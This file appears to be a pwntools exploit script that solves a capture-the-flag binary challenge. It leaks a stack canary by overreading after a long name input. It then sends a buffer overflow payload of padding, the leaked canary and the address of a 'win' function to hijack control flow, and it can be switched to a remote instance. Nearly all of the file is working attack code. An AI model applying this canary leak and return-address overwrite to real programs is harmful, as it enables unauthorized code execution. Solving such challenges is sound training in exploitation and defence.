from pwn import *

context.log_level = 'debug'

REMOTE = 0 # Change to 1 to run the exploit on the remote instance
GDB = False

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()
    if GDB:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(p, """
            b main
            b print_wrapped
        """)

io = r = p # use whichever you like for communication

NAME = b'a' * 0xd9

p.sendafter(b"name: ", NAME)
res = p.recv(0x105)
canary = b'\x00' + res[0xf5:(0xf5+8)][1:]
win = p64(e.sym.win)

MESSAGE = b"a"*0x68 + canary + b'a' * 8 + win
p.sendline(MESSAGE)
